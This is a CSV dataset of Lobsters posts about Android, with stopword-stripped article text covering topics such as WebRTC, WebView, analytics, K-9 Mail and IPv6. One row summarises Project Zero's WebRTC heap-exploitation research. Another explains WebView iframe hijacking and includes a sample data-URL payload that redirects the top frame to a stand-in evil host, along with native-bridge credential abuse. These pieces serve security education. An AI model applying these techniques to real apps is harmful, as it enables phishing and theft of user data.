ID,Source,Tag_Code,Tag_Name,Title,Url,ProcessdedTitle,WeightedContent,Content
1,Lobsters,android,Android,In search of the perfect pocket device,https://isene.org/2020/08/Nerding.html,search perfect pocket device,hp calculator collector vim lot nice program ericsson psion series zero terminal samsung ultra small foldable bluetooth keyboard hyperlist ruby amar tool package latex ssh weechat termux xsdl userland urxvt zsh gimp libreoffice http,lockdown geekery searching perfect pocket computer setup hp calculator collector since couple decade passion pocket computing power really long battery life amazing calculator month battery life still calculator also want real computing power ability run vim editing text decent keyboard much goody cram started quest perfect pocket computer reviving old early pocket computer running do vim running do device run lot nice program yes slow cool search better keyboard got ericsson psion series pocket computer running hoping make boot linux possible turn cf card reader device flaky kept searching forum later stumbled upon interesting project zero terminal talking raspberry pi zero packed sort port expansion capability waiting patient wait minute always carry samsung ultra anyway serve need true battery life suck cell phone always charged problem small foldable bluetooth keyboard massive computing power time added benefit easily use monitor tv screen via builtin smart view real kicker run vim galore even hyperlist plugin run ruby whole amar tool package latex ssh weechat name lot terminalconsole program readily available via termux x server app xsdl userland app fact install full linux distro fire android phone full glory terminal graphical software run session urxvt terminal running zsh gimp libreoffice whatnot nerdvana via looking zero terminal found answer right pocket quite detour ending bliss link post http
2,Lobsters,android,Android,Clean Surveys in Android,https://chelseatroy.com/2020/07/27/clean-surveys-in-android/,clean survey android,nurse amie last post symptom modifier frequency severity interference reusing view android view binding dupe liked piece might also like threepart series teaching programming course behind scene levelingup series like,reading time minutesthis summer adding feature nurse amie android app proposed developed tested dr kathryn schmitz penn state cancer institute last post app talked role empathy mobile apps care management discussed user interface design decision went weekly survey form mattered post talk technical execution form help understand decision form need see question severity decreased appetite worst much decreased appetite interfere usual daily activity often nausea severity nausea worst often vomiting severity vomiting worst severity constipation worst often loose watery stool diarrheadiarrhoea often pain abdomen belly area severity pain abdomen belly area worst much pain abdomen belly area interfere usual daily activity severity shortness breath worst much shortness breath interfere usual daily activity severity cough worst much cough interfere usual daily activity severity numbness tingling hand foot worst much numbness tingling hand foot interfere usual daily activity often pain severity pain worst much pain interfere usual daily activity severity fatigue tiredness lack energy worst much fatigue tiredness lack energy interfere usual daily activity severity pain burning urination worst often hot flashesflushes severity hot flashesflushes worst question set radio button response like many question similar exactly show placed seam choose whether agree choice among question notice one take two category symptom question asks one thirteen symptom decreased appetite nausea vomiting constipation diarrhea abdominal pain shortness breath cough numbnesstingling general pain fatigue urination pain hot flashesflushes modifier question asks one three modifier frequency severity interference daily life symptom question three modifier question one two want view divide survey section symptom real potential duplication code though lie radio button question fall three modifier category modifier category radio button label frequency never rarely occasionally frequently almost constantly severity none mild moderate severe severe interference little bit somewhat quite bit much reusing view android android allows u extract layout xml file include layout file like case layout fragmentweeklysurveyxml includes custom view life xml file called severityquestionxml weird rule custom layout work first assign id custom view see line get registered also assign layoutwidth layoutheight see line also want able assign id custom layout contain single child child layout type like android developer world cringe fragmentweeklysurveyxml already base layout meaning custom view nest layout inside layout deeper go longer take android render screen luckily one layer usually produce noticeable difference moreover case weekly survey fragment base layout already linearlayout stack view top without overlapping additional linearlayout custom view provide new information view arranged android way around called merge tag could put custom view inside merge tag tell android drop view inside wholesale parent layout without requiring layout tried app turn merge tag play nice assigning id custom view need able tell radio group answering question fragment view binding onresume method fragment see view binding yikes long repetitive theoretically could fancy metaprogramming string evaluation view id collect question response think length alone sufficient justification something clever instead leaving clear happening also worth noting line would unnecessary view binding long variable name view id even turn camelcase version equivalent snakecaseviewids unfortunately view binding play nice include syntax process trying code base learned generated view binding class look like producing efficient pattern generating boilerplate devs writing manually minimally helpful would edge helpful worked seamlessly happening believe generated class need explicitly casting view assignment findviewbyid viewtype rather straight findviewbyid point rather spend three minute cranking boilerplate know going work patch generated code view binding add null safety findviewbyid lack theoretically big selling point guess found special sauce nonnull annotation still edging functioning boilerplate much moving line tie response view name use refer question response answer line form submission map keyvalue pair new keyvalue pair key original pair pointing string label radio button filled question null instead introducing logic handle null set default value unknown unanswered question happens also insist question answered letting someone submit form even app would crash null pointer exception method extract response string custom response view set form valid invalid based whether question answer code also reveals purpose surveyresponses hash initialize onresume line manipulate background color view hash value help person easily see response still need filled try submit without completing whole form dupe extricate custom view collection section header question duplicate wording question therefore propagates code okay experience drying text code matter subtle difference fun thought experiment fare well costbenefit analysis programmer tend assume xml render hot flashesflushes question see life fragmentweeklysurveyxml file look like could theoretically use data binding consolidate common view pattern little struggled could find solution example make textviews included questionview pas text attribute love better way label handle response adding removing question requires change fewer place personal aesthetic preference though evidence far need view next post application talk persist weekly survey data local database liked piece might also like threepart series teaching programming course behind scene series levelingup series advancing skill soon audiobook read truly preorder like like loading
3,Lobsters,android,Android,Exploiting Android Messengers with WebRTC: Part 1,https://googleprojectzero.blogspot.com/2020/08/exploiting-android-messengers-part-1.html,exploiting android messenger webrtc part,,posted natalie silvanovich project zero threepart series exploiting messenger application using vulnerability webrtc series highlight go wrong application nt apply webrtc patch communication notification security issue break part scheduled august part scheduled august part first attempt webrtc open source video conferencing solution used variety software including browser messaging client streaming service project zero reported several vulnerability webrtc past clear whether bug exploitable especially outside browser investigated whether two recent bug exploitable popular android messaging application bug vulnerability webrtc remote transport protocol rtp processing rtp protocol webrtc us transport audio video content peer peer rtp support extension extra piece data included packet tell destination peer display process data example extension contains information screen orientation sending device one contains volume level vulnerability occurred extension implemented webrtc occurred frame marking extension contains information video content split frame bug process layer information webrtc support five layer layer number threebit field extension mean go high seven lead outofbounds write following code temporalidx set layer number extension layerinfoit second temporalidx aheadof layerinfoit second temporalidx frame idpictureid newer frame subsequent layer info need update break layerinfoit second temporalidx frame idpictureid final line code outofbounds write occurs array contains five element bug also limitation obvious code start check write check whether current value memory casted unsigned integer current sequence number write occurs true practically much limitation crash usually occurred two three time tested serious limitation layerinfoit second field integer type frame idpictureid integer mean bug allows attacker write three integer outside fixed size heap buffer value written limited small represent pointer bug video timing extension processed forward error correction fec fec copy incoming rtp packet clear certain extension attempting correct error vulnerability occurs extension video timing type verified expected length cleared code causing bug follows case rtpextensiontype krtpextensionvideotiming nullify last entry packetization delay network timestamps byte p writeat extensionoffset videosendtiming kpacerexitdeltaoffset memset p break value videosendtiming kpacerexitdeltaoffset code writes six zero offset offset start extension packet however check extension data byte long even packet number byte left result bug attacker write six zero heap offset seven byte variable sized heap buffer bug better way worse others better heap buffer overflowed variable size give lot option overwritten bug heap offset also offer flexibility zero written write aligned whereas requires alignment bug worse value written zero size area written smaller six byte versus moving instruction pointer started seeing possible use either bug move instruction pointer modern android us jemalloc slab allocator use inline heap header corrupting heap metadata option instead compiled webrtc android symbol loaded ida went available object type see anything could obviously used move instruction pointer improve capability bug find anything thought maybe could use overwrite length cause larger overflow problem start bug writes integer meanwhile lot length field integer mean write also overwrites something else write nonzero value length aligned location bug processing also problematic overwrite near end incoming packet processed meaning many object accessed point overwritten memory would never used also overwrites heap buffer fixed size limit object type affected bug think would viable purpose either write zero make length smaller sure go point triggered dozen time android see crash address wider hoping might give idea way bug could influence behavior code overwriting pointer invalid value surprise crashed instruction pointer set value clearly read heap one time analyzing crash turned stunmessage object allocated overflowed region member stunmessage class follows protected std vector std uniqueptr stunattribute attrs private type length std string transactionid reducedtransactionid stunmagiccookie vtable first member vector vector laid memory turn first two member follows pointer begin pointer end pointer point beginning end vector content memory crash end member overwritten small integer vector iteration work starting begin pointer incrementing end pointer reached change mean next time vector iterated usually destructor go bound since vector contains virtual object type stunattribute perform virtual call element call destructor virtual call outofbounds memory moving instruction pointer seemed like reasonable way control instruction pointer except one problem typical configuration possible attacker one end webrtc connection send stun user instead communicate stun server asked philipp hancke webrtchacks knew way suggested method involves specifying tcp server controlled attacker potential routable path two peer called ice candidate attacker target device communicate server including stun message allowed send stun message unusually large number attribute necessary order control instruction pointer would need able control showed memory stun attribute vector jemalloc allocates similar sized allocation determined predefined size class contiguous memory run le used size class likely two object size class allocated one typically stun message small number attribute translates vector buffer size byte frequently used size class instead sent stun message attribute translated vector buffer size byte happens infrequently used size class webrtc sending many stun message number attribute time sending rtp packet size containing desired pointer value interspersed packet containing bug able get virtual call pointer value one five time good enough use exploit decided move breaking aslr breaking aslr two possible approach breaking aslr exploit one use one bug read memory send back attacker device tcp server somehow use sort crash oracle determine memory layout started seeing whether possible use one bug read memory remotely target device mark brand suggested might possible use accomplish setting low byte pointer outgoing data zero causing outofbounds data sent instead actual data seemed like promising approach used ida look potential object turned quite problem spent time sendpacketmessagedata datareceivedmessagedata object used store pointer outgoing rtp data queued contain copyonwritebuffer object first member refcounted pointer rtc buffer object possible set bottom byte pointer zero using unfortunately structure rtc buffer made revealing memory way challenging refcountedobject vtable sizet size sizet capacity std uniqueptr data hoping would possible make clipped pointer structure point object heap pointer location data pointer data would get sent instead however turned process sending data four member object get accessed need reasonably valid went available object size class rtc buffer class find one exact property considered instead using different object could use rtc buffer object already freed specific backing buffer size could replaced object containing pointer using heap manipulation work either largely issue reliability start rtc buffer object byte translates size class jemalloc meaning byte get allocated imagining contiguous allocation type address would follows buffer buffer buffer buffer buffer buffer buffer first byte buffer set zero vulnerability land valid buffer buffer set zero divide evenly end result every time bug hit sendpacketmessagedata object one three chance end pointing valid rtc buffer hitting object first place also unreliable many allocation similar size made webrtc possible increase number object heap amount time sent using tcp server make connection slow even could hit structure le time manipulate heap many freed rtc buffer object row first place backing replaced something containing pointer added even unreliability eventually abandoned approach think could get reliable enough use exploit reasonable amount effort though think probably possible crash behavior application attacked also matter lot would probably work application respawns immediately case crash would lot le practical application stop respawning unless certain delay common android also looked lot outgoing packet generated webrtc especially remote transport control protocol rtcp peer always sends even receiving audio video however outgoing packet generated stack possible alter using heap corruption bug also considered using crash oracle break aslr felt unlikely succeed specific bug start hitting heap allocation unreliable would difficult tell whether crash occurred due specific condition bug failed also unsure whether would even possible create detectable condition considering limited capability bug also thought using alter vtable function pointer order read memory cause behavior detectable crash oracle perform offsetbased exploitation require aslr broken decided pursue path end result would depend function vtables loaded location ending zero varies greatly build exploit written using method would require large amount modification work even slightly different version webrtc guarantee would work decided point needed look new bug could break aslr neither one found recently could easily stay tuned part better bug scheduled wednesday august
4,Lobsters,android,Android,Android System information command line tool,https://github.com/sbz/android-sysinfo,android system information command line tool,androidsysinfo overview system property c api bionic requirement build adb run output device htc magic htc magic nexus nexus nexus nexus huawei huawei pro,androidsysinfo overview androidsysinfo android native program report system property android device using system property c api existing android libc bionic simlar setting system phone system information displayed mobile device report model build version kernel info etc requirement need install android sdk android ndk use adb ndkbuild used build process build build makefile using adb determine android version abi ndk use order produce binary connect android device via usb enable usb debugging run make push run make run output device personal android device output information look like htc magic htc magic model name htc magic android codename sapphire android version android sdk version kernel version linux androidbuild preempt thu jul pdt baseband version build number nexus nexus model name nexus android codename crespo android version android sdk version kernel version linux androidbuild preempt mon sep pdt baseband version build number nexus nexus model name nexus android codename shamu android version android sdk version kernel version linux androidbuild smp preempt wed aug utc baseband version build number huawei huawei pro model name android codename clt android version android sdk version kernel version linux test smp preempt thu dec cst baseband version build number
5,Lobsters,android,Android,WebView - Android's most convenient footgun,https://byte.how/posts/webview-androids-most-convenient-footgun/,webview android convenient footgun,webview scratch paper differential context vulnerability dcv vulnerability difference context design flaw compact design insecure setting attack sandbox navigation attack privileged navigation attack current overlay attack android viewgroup rendering closure attack part overwritten origin hiding sameorigin policy sop required frame hijacking message forgery api native bridge hijacking inject javascript interface alternative chrome custom tab chrome custom tab trusted web activity trusted web activity twa covered conclusion dcv paper tweet,imagine web developer got little bit android experience built progressive web beautiful functional responsive everything user see meticulously placed crafted purpose proud done take webcentric experience apply android veneer like devs probably find reaching webview present web page app interface along basket feature incredibly convenient let say site interface constantly updated would want deploy new build change course pull shit dynamically webview way user get benefit native platform update speed live websitewebviews offer complete customization ui get level control alternative would either use builtin component android provides combine create scratch basically webviews need redeploy every changequick testing common tool web developer already used tonative app utilize web app functionality may proper api yet customizability lower effortas might expect come free implemented incorrectly could extensive security implication webview usher convenience also significantly increase attack surface security researcher wasted time exploring attack vector believed mitigated browser still viable within webviewsin article explore paper guangliang yang jeff huang guofei gu presented usenix investigate previously wellunderstood topic iframe security within context webview paper focus naming differential context vulnerability dcv web page running within webview opposed running browser introduce vulnerability given difference context may run discovered although vulnerability safeguard introduced traditional browser mitigation either ineffective impossible apply within context webviewswe take look attack proposedesign flawswebviews interesting target two primary reason compact design wealth setting ripe misconfigurationcompact designall attack take advantage fact unlike traditional browser webviews provide enough context end user whenever navigation occurs browser address navigation status bar addition tab control easy user tell page navigating away case webviews simply render topmost page within rendering queueinsecure settingsthe author claim webviews insecure rather focus insecure combination setting app developer may utilize settingmethodimpactwebsettingssetjavascriptenabled true allows page execute javascriptwebsettingssetjavascriptcanopenwindowsautomatically true javascript call windowopen websettingssetsupportmultiplewindows true popups rendered new webviewsviewgroupaddview add new view top viewgroupwebchromeclientoncreatewindow allows custom implementation popup creation handledwebchromeclientonclosewindow handler javascript call windowclose window close eventsnot setting need set order deem application vulnerable setting potentially dangerous even combined others explore attack make use vulnerability brought misconfigurationattacksfor following example assume page structure loaded webview parent page loaded webview via webviewload family methodsthis parent page embeds iframe trusted source http trustedcomhttps trustedcom embeds iframe untrusted source http adscomhttps adscom may un intentionally serve malicious iframe depending ad contentnotefor max attack success assume malicious ad retrieve frame content remote url instead us data url laterinfosince interested looking failure scenario assume sandbox applied iframe navigation attacktraditional navigation attackthis simple attack capitalizes webview lack navigation element click link redirects top frame malicious page untrusted iframe could embed link navigates parent frame malicious page navigates top frame malicious siteonce clicked webview redirected clear indication user none wiserprivileged navigation attackin addition navigation attack applies browser android vulnerable variant bypass sandbox top navigation restriction iframe allowed create popups sandbox sandbox set allowpopups frame open popup android always try select webview render popup supportmultiplewindows set false window created popup therefore android selects current webview essentially navigating parent frame anywayprivileged navigation attack specific androidwarningif javascriptenabled javascriptcanopenwindowsautomatically true frame also create popup windowopen showmodaldialog overlay attackhijacking ui overlay attacklike privileged navigation attack overlay attack take advantage android viewgroup rendering mechanic webview misconfiguration webview susceptible supportmultiplewindows set trueandorby default whenever popup created supportmultiplewindows true android create new webview add parent viewgroup current webview become last child parent android render view within viewgroup start drawing first child iterates viewgroup child rendering view top last popup webview last child viewgroup topmost rendered view thing user see gain full control ui misbehaving iframe need create popup closure attackhijacking ui closure attackwhat app us viewgroupaddview view part oncreatewindow handler fact mitigation overlay attack app could still danger webchromeclientonclosewindow overwritten javascriptenabled true app susceptible closure attack work like frame creates popup android creates appends new webview containing popup viewgrouppopup call windowclose original parent frame onclosewindow naive check whether parent webview closed close anywayparent webview removed viewgroup popup webview remainsthe user see popup ui hijackedorigin hidingso far previous attack require user interact malicious element sameorigin policy sop even javascript enabled none malicious frame able automatically navigate top frame would require frame share originorigins equivalent whenever protocol host port match two null origin also origin null according html specification browser required treat data url origin opaque value handy instance medium need loaded without violating sop summary parent frame null origin child frame null origin part origin longer violation sopfor general browsing rare find legitimate use case parent page need loaded via data url however android application acceptable initialize webview inline html snippet instead retrieving remote urlconsider string html html body widget iframe src http trustedcom iframe body html string encodedhtml unencodedhtmlgetbytes webviewloaddata encodedhtml texthtml webview initialized html snippet describing simple widget pull iframe trusted site webview initialized inline data parent frame origin null therefore child frame sourced data url trustedcom child produce origin parent frame null origin child frame essentially granted full controlinfofor next example assume javascriptenabled true parent webviewframe hijackingif iframe full control parent simplest thing power navigate parent frame malicious page since webview make apparent navigation occurs phishing page become much convincinglet assume trustedcom embeds iframe src http adscom unbeknownst trustedcom adscom hosting malicious ad malicious ad want navigate parent evilcom malicious ad running inside adscom frame origin http adscom according sop navigate parent however create another child frame data url child frame share origin parent frame whatever like first let look source malicious child html body script topwindowlocation http evilcom script body html converted data data texthtml malicious ad embeds iframe html body serve ad iframe src data texthtml iframe body html soon ad load parent frame navigated evilcom automatically look like slightly slowed example malicious ad hijack parent frame load facebook phisher android app automatically redirected frame hijackingmessage forgeryforging message framesconsider case parent frame need communicate trusted child frame via postmessage api parent issue message like windowframes postmessage hello parent http trustedcom trustedcom frame listens message know parent frame null origin check whenever receives message act message come expected windowonmessage function event eventorigin null privileged action scheme adscom may postmessage trustedcom message sent unacceptable http adscom origin however described earlier malicious ad embed child frame null origin similar frame hijacking child frame effectively becomes parent frame parent communicate trustedcom child could bad news trusted frame implement sensitive functionalitynative bridge hijackingaccessing privileged operation native bridgethe primary purpose webview present native android interface served web compared native application web page limited interact client device missing native functionality could jarring end user may aware viewing web page order bridge semantic gap webview allows application developer inject javascript interface granting access native java object within web app used carelessly functionality could allow privileged access untrusted codein example diagram let assume app expose apis web application createnotification creates native notification applicationgethistory get complete browsing historygetcredential get credential device credential storenotei know app might surface functionality web page go method origin checking clearly insufficient parent frame creates notification native bridge allows expects null origin next better ad personalization adscom frame try get complete browser history bridge reject citing unacceptable origin unfortunately malicious child share null origin native bridge allows retrieve credential alternativesthere doubting webview utility facilitates rapid development encourages crossplatform consistency could used powerful stopgap seen implemented incorrectly could greatly increase application vulnerable surface area google realizes provides secure alternativeschrome custom tabsif simply want render view web view may redirect user outside domain opt chrome custom tab robust solution address design flaw explored feature highlight toolbar user know navigation occurs application even register navigation callback external navigation occursshared session cookie jar user default browserprewarming background page user likely visittrusted web activitiesif full screen web content must need mix native web component trusted web activity twa recommended approach verify page loaded fact application expects loaded page fails verification app fall back showing chrome custom tab making clear external navigation occurred application requires multiple origin twa coveredconclusionif need serve content web application considering using trusted alternative absolutely must use webview wary configure setting make sure untrusted content sandboxedthis article summarizes finding excellent dcv paper presented usenix discussed automated vulnerability scanning tool built used survey popular apps google play store found potentially vulnerable including facebook instagram skype kayak leading application highly recommend read course got feedback tweet away
6,Lobsters,android,Android,Complete Android Fragment & Activity Lifecycle,https://github.com/xxv/android-lifecycle,complete android fragment activity lifecycle,complete android fragment activity lifecycle steve staticfreeinfo pdf svg note dia inkscape license creative common bysa license,complete android fragment activity lifecycle struggling trying figure various piece fit together done research put together complete android activityfragment lifecycle chart two parallel lifecycles activity fragment organized vertically time lifecycle stage occur vertical order displayed across activity fragment way see fragment interact activity see discrepancy error diagram please submit pull request contact steve staticfreeinfo vector version suitable printing pdf svg note intentionally leaf usertriggered callback onoptionsitemselected focusing lifecycle stage triggered system order keep diagram focused part hard follow canonical format diagram dia file exported svg handtweaked fix font size imported inkscape svg pdf png render hope find better workflow going forward patch always welcome license diagram various form render licensed creative common bysa license would like different creative common license please contact figure something
7,Lobsters,android,Android,Dealing with phone numbers in contact book,https://ashishb.net/tech/dealing-with-phone-numbers-in-contact-book/,dealing phone number contact book,telephone country code prefixfree telephone number multiple representation std call multiple country share telephone code continuous area code country code always adjacent confirming phone number ownership like post navigation,building app us user contact book certain gotchas avoid telephone country code prefixfree country country code country get country code like scheme ensures number inherently unambiguous telephone number multiple representation since people dial internationally telecom system implicitly assume domestic call someone dialing u dialing person india dialing since international dialing would infrequent telecom require unique prefix number like distinguish whether someone country austria state even domestic area code explicitly required user might stored phone number telecom implicitly prefix user area code user want dial beyond area telecom operator would require additional prefix mark std call localization massive implication regarding processing cleaning normalizing phone number retrieved user contact book country code area code contain usually superfluous telecom might ok calling sending sm treat number like incorrect multiple country share telephone code usa canada many country caribbean share telephony code carrier would treat call sm international though italy vatican city share continuous area code country code always adjacent population grows certain area others code reserved region get allotted example san francisco bay area first allocated top existing area code deal growing population confirming phone number ownership never trust incoming call incoming sm phone number therefore way verify user owns phone number sending text message making phone call like like loading post navigation
8,Lobsters,android,Android,I replaced Google Analytics with a web server running on my phone,https://lbrito1.github.io/blog/2020/07/replacing_google_analytics_android.html,replaced google analytics web server running phone,tldr androidanalytics termux post table content motivation even keep anything vanity metric data lack competition matomo posted hacker news developing androidanalytics already tinkered blog post fundamental first iteration sinatra webapp sinatra second iteration nginx log parser goaccess wrote parser geocoder third iteration adding viewer grafana issue blazer fourth iteration adding installation script step setup script final architecture duckdns available github conclusion previous section navigate man moon back thousand time,tldr built androidanalytics web analytics tracker running phone say run blog personal website smalltime business page something sort say also want keep eye many visitor getting first thing people think point google analytics mostly work free also hosted google make easy start using many competitor bring point table google analytics usually win wo point used use google analytics track blog reason finding termux writing post installing web server android phone started toying idea armbased ram linuxlike device internet connectivity must enough simple webcounterlike application week tinkering table content motivation even keep anything going whole thing reasonable question answered even need collect data answer simple really enjoy seeing call vanity metric think plain cool know someone half across planet read something wrote month ago maybe crawler take either way surprise google analytics always felt immensely overkill heartwarming know nerd bhutan read one post wee hour morning pretty much interested could care le acquisition treemaps audience cohort analysis behavior flow making real product available google analytics idea mean yet sure need visitor counter wanted closer late visitor count gif minus embarrassment publicity unsightly intersitial online advertising network conglomerate seo dashboard feeling google analytics google analytics dashboard short wanted geek advertisement arbitrage data aforementioned google analytics great free hosted google keep data idea data even exactly tracker sending server judging number article showing keep payload cap must lot apparently often need per request feed lovecraftian audience cohort analysis line product fair enough pretty sure purpose severalkb payload effectively using sledgehammer kill fly using google analytics willfully sending google whoknowswhat kind data designed build people advertising profile page view blog probably help google much aspect sure principle whole thing still bothered enough something lack competition lot software similar google analytics prominent probably matomo often posted hacker news free open source selfhosted cloud offering monthly fee would happily use matomo come conundrum selfhosting implies kind publicly accessible linux host would likely entirely free cloudhosting come subscription fee point trivial running lucrative business need analytics paying service sound ludicrous want simple visitor stats personal blog developing androidanalytics requirement tracker run old android phone lying around work github pageshosted site perpage view count nice geo info requirement deceivingly simple quickly learned termux make really easy run many kind software android phone already tinkered web server termux something simple page view pretty straightforward also already registered dynamic dns subdomain pointing phone ready accept incoming traffic internet first major roadblock faced getting androidhosted web server communicate github page couple day research finally learned basically impossible make request http website github page http address dynamic dns subdomain summarize make work cost client browser something like actively mark allow mixed content checkbox somewhere browser flagsadvanced option lead excruciating path obtaining using verified ssl certificate android phone dynamic dns subdomain took long enough want write separate blog post tldr entirely possible get verified ssl cert dynamic dns subdomain entirely free depending isp different choice ssl challenge able receive tcp request port possible get certificate free figured ssl thing rest pretty much breeze fundamental tried different idea developing overall architecture always javascript code tracked page call android host android host save information database graphical tool used parse data something viewable chart etc first iteration sinatra webapp started sinatra webapp single post endpoint would receive request tracked page immediately save postgres database used nginx reverseproxy handled traffic passing sinatra approach merit simple understand reliable also worked watching work day realized whole webapp part superfluous nginx log access default log contain information need page requested time ip lead naturally second iteration second iteration nginx log parser nginx provides flexible perendpoint log log activated endpoint want damnfinecoffee deactivated everything else important internet full crawler annoyingly hit root path obviously count page view learned web also surprisingly full smartypants trying make way tplink admin also wanted ignore log provided data needed still needed transform data useful information found goaccess hacker news perhaps surprisingly worked box termux goaccess dashboard androidhosted data point could settle goaccess seem provide geo info always thought would cool feature kept working tool configured nginx print csvlike log wrote parser transforms log entry db entry geographic information provided excellent geocoder gem also annonymizes request ip using hashing final step adding cron entry run parser regularly point getting regular traffic converted row postgresql table still needed convenient way look data though third iteration adding viewer initially thought using grafana visualization tool free easy use flexible already familiar unfortunately grafana binary available termux issue open termux repo requesting feeling like trying compile manually thankfully found blazer gem similar concept compared grafana write sql query transforms chart exactly looking downside requires fullfledged rail application run okay tradeoff data look like right fourth iteration adding installation script far playing ear knew le reinstall project new device knew time memory would fade process would become painstaking trialanderror mess first compiled step needed work repo readme took total step get thing running noticing step could automated wrote setup script work tested separate android device make sure work hopefully work people well final architecture someone access one tracked page roughly happens javascript page call domain provided free duckdns duckdns translates address router recent ip router receives request us nat table redirect android phone android nginx receives request either log request come right place list tracked page nothing otherwise scheduled cron job rotates nginx log convert old log row postgresql table open myandroidlocalip desktop browser view chart map etc diagram show step le androidanalytics diagram named quite unimaginatively androidanalytics code setup instruction available github conclusion used google analytics analogy tool people familiar people immediately understand thing probably happen instead saying simple google analytics alternative said logbased web analytics tool saying google analytics replacement like saying bicycle replacement truck although transportation mode different every aspect thing sometimes really need truck lot time need get point point b bike enough fact probably better cheaper easier park carry around smaller environmental footprint project bike people need absolutely need use mammoth like google analytics personal blog pet project wasteful offering free data google exchange fancy dashboard play mseomasteratadcorpllc someone keep data course argue decentralized approach much safer probably ethical data monopoly single huge advertising company alternative competitor already discussed previous section processing power lying around free unused might well make better use smartphones amazing processing networking storage capability yet many reason turn old quickly translates getting sold best case shoved oblivion designated ejunk clutter drawer discarded sad tiny slab processing power could navigate man moon back thousand time seem quite find better occupation sitting dusty drawer year getting trashed even take little extra effort rather repurpose reuse something already subscribe fanciest new paas
9,Lobsters,android,Android,"Germany’s coronavirus contract tracing app is out today, and is open source",https://github.com/corona-warn-app,germany coronavirus contract tracing app today open source,grow team github sign repository issue need help issue need help package package package package used topic reload reload,dismiss grow team github github home million developer working together join grow development team manage permission collaborate project sign repository native android app using applegoogle exposure notification api kotlin issue need help updated aug native io app using exposure notification framework apple swift issue need help updated aug backend implementation applegoogle exposure notification api java updated aug html updated aug backend implementation verification process package java updated aug project overview general documentation white paper tex updated aug backend implementation test result information package java updated aug package freemarker updated jul frontend implementation verification process package java updated jul central repository collect community feature request improvement updated jul backlog item coronawarnapp updated jun coronawarnapp issue public hotline updated jun used topic perform action time signed another tab window reload refresh session signed another tab window reload refresh session
10,Lobsters,android,Android,A lightweight dex file parsing library,https://github.com/tboox/dexbox,lightweight dex file parsing library,become sponsor,dexbox lightweight dex file parsing library xmake run dexdump teststestsdex file castjava class cast super object method public void init register argument catch prologue invokedirect object init void returnvoid method public int main javalangstring register argument catch prologue sgetobject systemout printstream conststring test invokevirtual printstreamprintln string void sgetobject systemout printstream conststring test cast invokevirtual printstreamprintln string void sgetobject systemout printstream conststring invokevirtual printstreamprintln string void ff inttolong sgetobject systemout printstream newinstance stringbuilder invokedirect stringbuilder init void conststring num invokevirtual stringbuilderappend string stringbuilder moveresultobject invokevirtual stringbuilderappend long stringbuilder moveresultobject invokevirtual stringbuildertostring string moveresultobject invokevirtual printstreamprintln string void inttoshort sgetobject systemout printstream newinstance stringbuilder invokedirect stringbuilder init void conststring num invokevirtual stringbuilderappend string stringbuilder moveresultobject invokevirtual stringbuilderappend int stringbuilder moveresultobject invokevirtual stringbuildertostring string moveresultobject invokevirtual printstreamprintln string void inttochar sgetobject systemout printstream newinstance stringbuilder invokedirect stringbuilder init void conststring num invokevirtual stringbuilderappend string stringbuilder moveresultobject invokevirtual stringbuilderappend int stringbuilder moveresultobject invokevirtual stringbuildertostring string moveresultobject invokevirtual printstreamprintln string void inttobyte sgetobject systemout printstream newinstance stringbuilder invokedirect stringbuilder init void conststring num invokevirtual stringbuilderappend string stringbuilder moveresultobject invokevirtual stringbuilderappend int stringbuilder moveresultobject invokevirtual stringbuildertostring string moveresultobject invokevirtual printstreamprintln string void ffff ffff sgetobject systemout printstream newinstance stringbuilder invokedirect stringbuilder init void conststring num invokevirtual stringbuilderappend string stringbuilder moveresultobject longtoint invokevirtual stringbuilderappend int stringbuilder moveresultobject invokevirtual stringbuildertostring string moveresultobject invokevirtual printstreamprintln string void sgetobject systemout printstream conststring invokevirtual printstreamprintln string void sgetobject systemout printstream conststring test cast ok invokevirtual printstreamprintln string void return support project becoming sponsor logo show link website become sponsor
11,Lobsters,android,Android,What's up with K-9 Mail?,https://k9mail.app/2020/06/01/Whats-Up-With-K-9-Mail.html,mail,api level requirement people beta version else new website anxhelo lushka support forum fediverse fosstodonorg want help become beta tester donation via liberapay cketti github sponsor thank forum thread,release latest stable version mail september nearly two year ago course many wondering mail dead happy inform case work mail slow time never really stopped update app combination thing major factor api level requirement google play required u make change internals app order able publish update via play store time started long anticipated modernization user interface still lot work done people beta version end published beta version mail user interface state functionality accessible since released beta version app state ready daily usage feature available still missing time restore deliberately removed consider important enough justify maintenance burden would like release new stable version soon possible one feature remove without want ship new stable version app push imap idle added spend time focusing fixing bug reported beta tester release next stable version mail else new two year long time else new ask quite website website probably noticed look much nicer thanks anxhelo lushka redesigned website also fancy domain name support forum set support forum mail user help also use discussion everything related mail presence fediverse fosstodonorg also twitter made much use account yet plan least announce blog post new app release want help become beta tester help u find fix bug make stable version help create improve existing documentation user new developer want contribute project developer always welcome particular point time looking add new feature help fixing bug would certainly shorten time new stable release mean consider making donation via liberapay march cketti mail lead developer decided give working mail full time try mostly financed personal saving donation help prolong time able keep want also sponsor via github sponsor currently matching donation thank would like use opportunity say thank people regularly contribute mail developer translator user help user support question continually spread word mail year also lot people reported bug suggested feature improved translation developer fixed one bug annoyed year work accumulated big part make mail day thank finally thank everyone contributed financially question comment please let u know forum thread
12,Lobsters,android,Android,It’s 2020 and Android’s IPv6 Is Still Broken,http://lostintransit.se/2020/05/22/its-2020-and-androids-ipv6-is-still-broken/?doing_wp_cron=1590483464.2139940261840820312500,android still broken,rfc thing greenfield get start want support broken implementation think know better user spy serve ad sell data slaac work google one decide get dictate option android still broken,got interesting discussion twitter someone asked android getting support version o developed initially rfc idea forget learned design ground sound good theory ignores completely lesson learned mention thing greenfield almost network existing one get start shiny view end end connectivity everywhere slaac allowed get like saying wish war unfortunately people stupid war naivety similar teenager growing want change world realize world run money mega corp dirty politician whole mess led holy war slaac rdnss v please note slaac even initially option setting dns server basically meant partial implementation pretty useful dns initially microsoft operating system support slaac rdnss android want support meant support two operating system subnet much surprise android still broken implementation design going fix couple valid argument google lorenzo colitti pretty weak irony though people asking google willing implement think know better user happily spy serve ad sell data allowing run would disservice doubt slaac work work fairly large environment still mind better option fallacy many evangelist take ivory tower view ignoring business requirement business requirement compliance requirement need track host ip time also enterprise stupid thing fact google one decide get could course run slaac simultaneously read google thread see many people wasted lot time valid business reason want implemented ability assign suffix megacorpcomregister host dnskeep track host ip certain timeimage deployment via pxe think dhcp option dhcp option used example wlcability easily swap dns server entire network think umbrella deployment deployment want radius server see dhcp requestneed support ip phone sure workarounds use case point enterprise need google anyone else matter dictate option hand sadly even android still broken implementation
